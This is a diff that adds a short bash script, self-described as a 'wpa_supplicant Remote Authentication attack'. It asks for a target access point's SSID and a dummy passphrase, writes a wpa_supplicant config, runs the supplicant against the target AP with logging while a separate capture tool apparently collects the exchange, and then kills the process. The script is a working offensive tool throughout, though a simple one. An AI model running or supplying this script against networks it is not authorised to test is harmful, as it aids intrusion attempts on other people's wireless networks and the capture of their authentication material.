@@ -1,0 +1,50 @@
+#!/bin/bash
+
+#preamble
+
+echo "This will run a wpa_supplicant Remote Authentication attack." 
+echo "We need to set up the target AP's SSID and a dummy password."
+echo "which will make a config file and run the attack."
+echo "         "
+echo "make sure you've killed necessary processes first."
+echo "           "
+sleep 4
+clear
+
+#settign up the config file
+echo "wpa_supplicant_ssid.conf file setup"
+echo "      "
+sleep 1
+read -p "SSID? : " ssid
+read -p "passphrase? : " pass
+echo "     "
+wpa_passphrase "$ssid" $pass | sudo tee /etc/wpa_supplicant/wpa_supplicant_$ssid.conf
+echo "      "
+sleep 1
+echo "Lookin' good?"
+sleep 2
+
+#running the actual attack
+echo "make sure you've got collect running."
+echo "     "
+sleep 1
+read -n 1 -s -r -p "Bring down the thunder? (Enter when ready)"
+clear
+echo "setting up the supplicant command"
+echo "         "
+read -p "interface? : " wlanINT
+read -p "log name? (no suffix please): " suppLOG
+sleep 1
+echo "        "
+echo "...and we're off"
+
+sudo wpa_supplicant -c /etc/wpa_supplicant/wpa_supplicant_$ssid.conf -i $wlanINT -B -f $suppLOG
+clear
+sleep 1
+#Killing the process
+echo "KILL IT!" 
+ps aux | grep wpa_supplicant
+read -p "ENTER PID: " pid
+sudo kill $pid
+echo "    "
+echo "Congratulations!"
